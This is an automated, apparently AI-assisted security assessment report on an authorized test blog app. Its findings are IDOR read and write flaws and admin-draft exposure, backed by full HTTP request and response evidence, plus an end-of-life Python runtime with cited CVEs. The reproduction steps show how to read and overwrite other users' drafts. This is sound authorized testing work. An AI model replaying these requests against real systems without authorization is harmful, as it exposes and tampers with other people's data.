# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — idor IDOR / BOLA: any user's private drafts readable via /{username}/drafts](#finding-1)
    - [2. HIGH — idor-write IDOR write: any authenticated user can overwrite another user's draft via POST /edit_draft/{id}](#finding-2)
    - [3. MEDIUM — idor IDOR: any authenticated user can read another user's private draft via /edit_draft/{id}](#finding-3)
    - [4. MEDIUM — idor Broken access control: non-admin user can read the admin's private drafts via /admin/drafts](#finding-4)
    - [5. MEDIUM — vulnerable-component Outdated & EOL Python 3.8.17 runtime — multiple known CVEs (CVE-2024-7592, CVE-2024-8088, CVE-2024-6232, CVE-2024-0397, CVE-2024-4032, CVE-2023-40217)](#finding-5)
    - [6. LOW — info-disclosure Username enumeration via registration error message](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqzc4w2r-5qv33w` |
| Target | http://target.local:5003/ |
| Started | 2026-06-29T14:50:50.973Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 13 mapped · 12 scanned · 1 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:5003`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 2 high, 3 medium, 1 low

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [idor] IDOR / BOLA: any user's private drafts readable via /{username}/drafts

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The drafts listing is served at a username-templated path /{username}/drafts and performs NO ownership check against the authenticated session. Logged in as low-privileged user 'test', requesting /admin/drafts returns admin's private drafts ("admin's Drafts", draft "admin_draft", and the edit link /edit_draft/1) — data belonging to another (administrative) user. Any authenticated user can enumerate and read any other user's private drafts (and discover their draft IDs for the /edit_draft/{id} endpoint) simply by substituting the username in the path. This is a Broken Object-Level Authorization (IDOR) flaw. Note: the endpoint itself does enforce authentication (unauth requests 302-redirect to login), so this is broken access control between users, not an auth bypass.

**Reproduction**

```
1. Authenticate as low-priv user 'test' (session cookie attached automatically). Baseline GET /test/drafts → 200, shows only "test's Drafts" (ev-mqzd11oh-29).
2. Negative control: GET /nonexistentuser_zzz999/drafts → 404 Not Found, 207 bytes (ev-mqzd1gwq-2b) — distinguishable failure.
3. Attack (positive #1): GET /admin/drafts as session 'test' → 200, 1370 bytes, body contains "admin's Drafts" + "admin_draft" + /edit_draft/1 (ev-mqzd1gb8-2a).
4. Attack (positive #2, repro): GET /admin/drafts again → identical 200 admin content (ev-mqzd1pyf-2c).
Result: cross-user private draft data is returned despite no ownership relationship between 'test' and 'admin'.
```

**Evidence**

- Evidence `ev-mqzd1gwq-2b` — `artifacts/s-0005/ev-mqzd1gwq-2b/`

Request:

```http
GET /nonexistentuser_zzz999/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:16:10 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzd1gb8-2a` — `artifacts/s-0005/ev-mqzd1gb8-2a/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1370
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:16:09 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin's Drafts</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>admin's Drafts</h2>
    <ul class="list-group">
        
            <li class="list-group-item">
                <h3>admin_draft</h3>  
                <a href="/edit_draft/1" class="btn btn-primary">View and Edit</a>
            </li>
        
    </ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqzd1pyf-2c` — `artifacts/s-0005/ev-mqzd1pyf-2c/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1370
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:16:22 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin's Drafts</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>admin's Drafts</h2>
    <ul class="list-group">
        
            <li class="list-group-item">
                <h3>admin_draft</h3>  
                <a href="/edit_draft/1" class="btn btn-primary">View and Edit</a>
            </li>
        
    </ul>

    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [idor-write] IDOR write: any authenticated user can overwrite another user's draft via POST /edit_draft/{id}

- Screen: `s-0008`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

POST /edit_draft/{id} enforces no ownership check. The 'test' user (who owns only drafts 2,3,4) POSTed new content to draft 1 (owned by admin) and the server accepted it (302 → /test/drafts). Subsequent GET /edit_draft/1 confirms the injected content persisted: marker "VERDICT-IDORW-A-mqzd" then "VERDICT-IDORW-B-mqzd" both replaced admin's draft body. Because the id is a sequential integer, any authenticated user can tamper with or destroy every other user's drafts. A POST to a non-existent id (99999) returns 404, proving the write only succeeds against a real cross-user object.

**Reproduction**

```
1. Log in as 'test'. 2. POST /edit_draft/1 with body title=admin_draft&content=VERDICT-IDORW-A-mqzd&submit=Submit → 302 redirect (accepted). 3. GET /edit_draft/1 → textarea now contains VERDICT-IDORW-A-mqzd. 4. Repeat with marker B → GET reflects marker B. 5. Negative control: POST /edit_draft/99999 → 404, no write. Ownership is never enforced on the path id for writes.
```

**Evidence**

- Evidence `ev-mqzdbd0v-32` — `artifacts/s-0008/ev-mqzdbd0v-32/`

Request:

```http
POST /edit_draft/99999 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

title=admin_draft&content=VERDICT-IDORW-NEGCTRL&submit=Submit
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:23:51 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzdbiu5-34` — `artifacts/s-0008/ev-mqzdbiu5-34/`

Request:

```http
GET /edit_draft/1 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1888
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:23:59 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Edit Draft</h2>
    <form method="POST" action="/edit_draft/1">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="admin_draft">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
VERDICT-IDORW-A-mqzd</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

- Evidence `ev-mqzdbxc4-36` — `artifacts/s-0008/ev-mqzdbxc4-36/`

Request:

```http
GET /edit_draft/1 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1888
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:24:18 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Edit Draft</h2>
    <form method="POST" action="/edit_draft/1">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="admin_draft">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
VERDICT-IDORW-B-mqzd</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [idor] IDOR: any authenticated user can read another user's private draft via /edit_draft/{id}

- Screen: `s-0008`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The edit-draft page at GET /edit_draft/{id} performs no ownership check on the draft id. The 'test' user owns only drafts 2, 3, 4 (per /test/drafts), yet GET /edit_draft/1 returns the edit form pre-populated with another user's private draft (title "admin_draft"). The draft id is a sequential integer (object_ref), so any authenticated user can enumerate and read other users' unpublished drafts. A non-existent id (99999) correctly 404s, proving the 200+content for id 1 is genuine cross-user data exposure rather than a catch-all.

**Reproduction**

```
1. Log in as 'test' (owns drafts 2,3,4). 2. GET /edit_draft/1 → 200, form value="admin_draft" (a draft not owned by test). 3. Repeat → stable. 4. Negative control GET /edit_draft/99999 → 404, no draft content. Ownership is never enforced on the path id.
```

**Evidence**

- Evidence `ev-mqzdaffd-30` — `artifacts/s-0008/ev-mqzdaffd-30/`

Request:

```http
GET /edit_draft/99999 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:23:08 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqzd9vz0-2y` — `artifacts/s-0008/ev-mqzd9vz0-2y/`

Request:

```http
GET /edit_draft/1 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1869
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:22:43 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Edit Draft</h2>
    <form method="POST" action="/edit_draft/1">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="admin_draft">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

- Evidence `ev-mqzdafyw-31` — `artifacts/s-0008/ev-mqzdafyw-31/`

Request:

```http
GET /edit_draft/1 HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1869
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:23:09 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Edit Draft</h2>
    <form method="POST" action="/edit_draft/1">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="admin_draft">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [idor] Broken access control: non-admin user can read the admin's private drafts via /admin/drafts

- Screen: `s-0009`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

The /admin/drafts route enforces only authentication, not authorization. Logged in as the regular non-admin user "test" (whose own dashboard redirects to /test/drafts), a GET to /admin/drafts returns HTTP 200 with the page titled "admin's Drafts" listing the admin user's private draft (admin_draft, with an edit link to /edit_draft/1). Any authenticated user, regardless of role, can read the admin's private drafts — a broken object/function-level access control (vertical privilege escalation). Anonymous access is correctly redirected to login, so this is reachable by any logged-in low-privilege user, not an anonymous bypass. probe_params found no hidden object-reference parameter; the route is hardcoded to the admin's drafts. This is a distinct endpoint from the already-recorded username-parameterised IDOR at /{username}/drafts.

**Reproduction**

```
1. Log in as the regular user "test". Confirm identity: GET /dashboard → 302 redirect to /test/drafts (ev-mqzdgpmh-3o), i.e. the session is the non-admin user "test".
2. Negative control (no session): GET /admin/drafts with no auth → 302 redirect to /?next=%2Fadmin%2Fdrafts, 235 bytes, no draft data (ev-mqzdg2ls-3l).
3. Attack (as test): GET /admin/drafts → 200, 1370 bytes, body titled "admin's Drafts" listing admin_draft and /edit_draft/1 (ev-mqzdg33j-3n, replayed at ev-mqzdg2lt-3m and ev-mqzdgqh8-3p — stable).
Result: the non-admin user "test" reads the admin's private drafts. Fix: enforce an admin role check on /admin/* routes, not just login.
```

**Evidence**

- Evidence `ev-mqzdg2ls-3l` — `artifacts/s-0009/ev-mqzdg2ls-3l/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 235
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:27:31 GMT
location: /?next=%2Fadmin%2Fdrafts
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?next=%2Fadmin%2Fdrafts">/?next=%2Fadmin%2Fdrafts</a>. If not, click the link.
```

- Evidence `ev-mqzdg33j-3n` — `artifacts/s-0009/ev-mqzdg33j-3n/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1370
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:27:32 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin's Drafts</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>admin's Drafts</h2>
    <ul class="list-group">
        
            <li class="list-group-item">
                <h3>admin_draft</h3>  
                <a href="/edit_draft/1" class="btn btn-primary">View and Edit</a>
            </li>
        
    </ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqzdg2lt-3m` — `artifacts/s-0009/ev-mqzdg2lt-3m/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1370
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:27:31 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin's Drafts</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>admin's Drafts</h2>
    <ul class="list-group">
        
            <li class="list-group-item">
                <h3>admin_draft</h3>  
                <a href="/edit_draft/1" class="btn btn-primary">View and Edit</a>
            </li>
        
    </ul>

    </div>
</body>
</html>
```

- Evidence `ev-mqzdgqh8-3p` — `artifacts/s-0009/ev-mqzdgqh8-3p/`

Request:

```http
GET /admin/drafts HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1370
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:28:02 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>admin's Drafts</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>admin's Drafts</h2>
    <ul class="list-group">
        
            <li class="list-group-item">
                <h3>admin_draft</h3>  
                <a href="/edit_draft/1" class="btn btn-primary">View and Edit</a>
            </li>
        
    </ul>

    </div>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [MEDIUM] [vulnerable-component] Outdated & EOL Python 3.8.17 runtime — multiple known CVEs (CVE-2024-7592, CVE-2024-8088, CVE-2024-6232, CVE-2024-0397, CVE-2024-4032, CVE-2023-40217)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:5003/

VERSION-BASED finding (matched by the HTTP Server response banner, not exploited). fingerprint_scan of http://target.local:5003/ returned `server: Werkzeug/3.0.6 Python/3.8.17`, disclosing the interpreter as CPython 3.8.17. Two issues: (1) Python 3.8 reached END-OF-LIFE on 2024-10-07 and receives no further security patches; (2) 3.8.17 is also behind the final 3.8 patch (3.8.20), missing fixes that landed in 3.8.18/3.8.19/3.8.20. Concrete CVEs affecting 3.8.17, several directly relevant to a web app: CVE-2024-7592 (quadratic-complexity / CPU-DoS in `http.cookies` parsing backslash-quoted cookie values; fixed 3.8.20); CVE-2024-8088 (infinite-loop DoS in `zipfile.Path`; fixed 3.8.20); CVE-2024-6232 (ReDoS in tarfile/`re` header parsing; fixed 3.8.20); CVE-2024-0397 (race / memory-corruption in the `ssl` module SSLContext cert store; fixed 3.8.19); CVE-2024-4032 (`ipaddress` private/global address misclassification; fixed 3.8.19); CVE-2023-40217 (`ssl` pre-handshake unauthenticated-data read / TLS-handshake bypass; fixed 3.8.18). Worst confident impact is DoS / TLS-handshake bypass — no confident interpreter-level RCE — hence medium, weighted up by EOL status. Note the `Server: Werkzeug/x Python/x` banner is emitted by Werkzeug's built-in development server, so this interpreter is exposed directly to clients. Operator should verify the exact installed micro-version on the host before relying on this. Remediation: migrate off EOL 3.8 to a supported patched line (3.12/3.13), or at minimum 3.8.20 short-term; suppress the version banner / run behind a production WSGI server.

**Reproduction**

```
1. GET http://target.local:5003/create_draft (or any app page) and inspect the response `Server` header. 2. Observe `Server: Werkzeug/3.0.6 Python/3.8.17` (captured via fingerprint_scan of the root and confirmed across stable replays of /create_draft). 3. Cross-reference Python 3.8.17 against python.org changelog / NVD: 3.8 is EOL (2024-10-07) and 3.8.17 predates fixes in 3.8.18–3.8.20 (CVE-2023-40217, CVE-2024-0397, CVE-2024-4032, CVE-2024-6232, CVE-2024-7592, CVE-2024-8088).
```

**Evidence**

- Evidence `ev-mqze3vkz-4q` — `artifacts/_/ev-mqze3vkz-4q/`

Request:

```http
GET /nonexistent-verdict-xyz HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: close
content-length: 207
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:46:02 GMT
server: Werkzeug/3.0.6 Python/3.8.17

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqze5de0-4r` — `artifacts/_/ev-mqze5de0-4r/`

Request:

```http
GET /create_draft HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1862
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:47:12 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                
            </ul>
        </div>
    </nav>
    <div class="container">
        
            
        
        
    <h2>Create Draft</h2>
    <form method="POST" action="/create_draft">
        
        <div class="form-group">
            <label class="form-control-label" for="title">Title</label>
            <input class="form-control form-control-lg" id="title" maxlength="100" minlength="1" name="title" required type="text" value="">
        </div>
        <div class="form-group">
            <label class="form-control-label" for="content">Content</label>
            <textarea class="form-control form-control-lg" id="content" name="content" required>
</textarea>
        </div>
        <div class="form-group">
            <input class="btn btn-primary btn-lg btn-block" id="submit" name="submit" type="submit" value="Save Draft">
        </div>
    </form>

    </div>
</body>
</html>
```

- Evidence `ev-mqze5e58-4s` — `artifacts/_/ev-mqze5e58-4s/`

Request:

```http
GET /create_draft HTTP/1.1
Host: target.local:5003
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 1862
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 15:47:13 GMT
server: Werkzeug/3.0.6 Python/3.8.17
set-cookie: <redacted>
vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Draft</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand"  >Blog Raider</a>
        <div class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item">
                        <a class="nav-link" href="/create_draft">Create Draft</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/dashboard">My Drafts</a>
